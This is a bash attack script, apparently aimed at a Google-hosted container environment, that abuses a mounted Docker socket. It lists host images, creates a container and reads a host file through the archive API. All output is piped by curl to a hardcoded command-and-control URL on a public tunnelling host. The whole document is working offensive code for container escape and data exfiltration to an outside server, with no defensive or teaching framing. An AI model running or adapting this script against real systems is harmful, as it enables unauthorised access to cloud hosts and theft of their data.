#!/bin/bash
C2_URL="417a97eeaad6dddf-103-95-173-85.serveousercontent.com"

{
  echo "=== [!] GOOGLE HOST ESCAPE REPORT: PRADEEP ==="
  echo "Timestamp: $(date)"
  
  # 1. List all available images on the host (Leaks internal Google images)
  echo "--- INTERNAL IMAGE LIST ---"
  curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | grep -oE '"RepoTags":\["[^"]+"\]' | head -n 5

  # 2. THE SECRET MOVE: The 'Docker Copy' Leak
  # We try to 'copy' a host file from a container that doesn't even exist yet. 
  # Sometimes the API leaks file presence even on failed operations.
  echo "--- HOST FILE PROBE ---"
  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
    -H "Content-Type: application/json" \
    -d '{"Image": "sha256:25109184c71bdad7"}' > /tmp/c_id.json
    
  C_ID=$(grep -oE '"Id":"[a-f0-9]+"' /tmp/c_id.json | cut -d'"' -f4)

  if [ -n "$C_ID" ]; then
    # We use the 'Archive' API to pull the host's containerd config
    # This proves we can look at the host's configuration
    echo "Exfiltrating Host Config..."
    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$C_ID/archive?path=/etc/hostname" | tar -xO
    
    # Cleanup
    curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$C_ID?force=true" > /dev/null
  fi

} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
